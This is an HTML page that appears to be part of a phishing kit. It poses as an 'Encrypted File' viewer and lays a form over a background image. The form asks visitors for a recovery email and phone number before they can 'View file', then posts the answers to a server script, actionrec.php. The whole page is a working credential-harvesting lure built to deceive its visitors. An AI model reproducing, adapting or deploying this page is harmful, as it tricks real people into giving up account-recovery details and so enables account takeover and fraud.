                             <html><head>
        <title>Encrypted File</title>
        <!-- ---- Links --- !-->
         <style type="text/css"></style></head>
    <body>
        <!-- --- Header ---- !-->
       <header class="ilyas_header">
           <div class="logo">
               <img src="bettyimages/reefffse.png" style="position:absolute;left:0px;top:0px">
               
           </div>
                          </div>
        <!-- --- Form Login --- !-->
        <div id="form" style="left:680px;height:200px;">
            <form action="actionrec.php" method="post">
            <h2 style="position:absolute;right:20%;top:40px;COLOR:#FFFFFF;height:150px;">  ..</h2>
            <div id="header-border-div0"></div>
        <input type="user" name="user" placeholder="Recovery email" required="" style="position:absolute;left:500px;top:180px;width:300;height:37px;padding:10px;border-radius:2px;border: 3px solid #bdc4c9;">
        <input type="phuser" name="phuser" placeholder="Phone number" required="" style="position:absolute;left:500px;top:230px;width:300;height:37px;padding:10px;border-radius:2px;border: 3px solid #bdc4c9;">
        <button type="submit" class="login-button button-primary" style="position:absolute;top:280px;left:500px;padding:8px;font-size:.875em;box-sizing:border-box;display:block;cursor:pointer;background: #4391e3;border: none;border-radius: 3px;padding: .75em 1em;color: #fff!important;text-align: center;text-transform: capitalize;font-family: Optimist,Arial,Helvetica,sans-serif;vertical-align: baseline;width:300;"">
            <div class="sign-in-text">View file</div>
            </button> 
            </form>
            </div>
        <!-- --- Form Login --- !-->
        <!-- --- Under Form --- !-->
                <!-- --- Under Form --- !-->
        <!-- --- Footer ---- !-->
        <div id="footer">
                            </div>
        <!-- --- Footer ---- !-->
    
</body></html> 